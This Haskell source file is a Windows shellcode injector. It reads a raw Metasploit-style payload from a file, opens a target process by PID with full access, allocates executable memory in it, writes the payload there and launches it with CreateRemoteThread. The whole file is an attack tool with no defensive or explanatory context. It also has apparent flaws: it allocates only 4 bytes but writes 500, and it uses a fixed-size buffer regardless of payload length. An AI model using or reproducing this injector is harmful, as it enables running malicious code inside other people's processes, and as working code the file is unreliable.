import System.Win32.Process (openProcess, ProcessAccessRights, pROCESS_ALL_ACCESS)
import System.Win32.Mem (virtualAllocEx, pAGE_EXECUTE_READWRITE, mEM_COMMIT, mEM_RESERVE)
import System.Win32.DebugApi (c_WriteProcessMemory, createRemoteThread)
import System.Win32.Types (nullPtr, DWORD)
import Data.ByteString.Internal (create)
import Data.Word (Word8)
import Foreign (Ptr)
import Foreign.Storable (poke)
import Foreign.Marshal.Array (pokeArray)
import Foreign.Marshal.Alloc (allocaBytes)
import Data.ByteString as B
import Text.Printf

import System.Environment

main :: IO()
main = do
  args <- getArgs
  contents <- B.readFile "C:\\Users\\Administrator\\Desktop\\msf.raw"
  Prelude.putStrLn (printf "[+] Injecting into process %s" (Prelude.head args))
  procHandle <- openProcess pROCESS_ALL_ACCESS False (read (Prelude.head args))
  Prelude.putStrLn "[+] Got process handle"
  memHandle <- virtualAllocEx procHandle nullPtr 4 mEM_COMMIT pAGE_EXECUTE_READWRITE
  Prelude.putStrLn "[+] Allocated memory"

  allocaBytes 500 $ \ptr1 -> do
   pokeArray ptr1 (B.unpack contents)
   c_WriteProcessMemory procHandle memHandle ptr1 500 nullPtr
   Prelude.putStrLn "[+] Wrote payload to allocated memory"
   remoteThread <- createRemoteThread procHandle nullPtr 0 memHandle nullPtr 0 nullPtr
   Prelude.putStrLn "[+] Started remote thread"
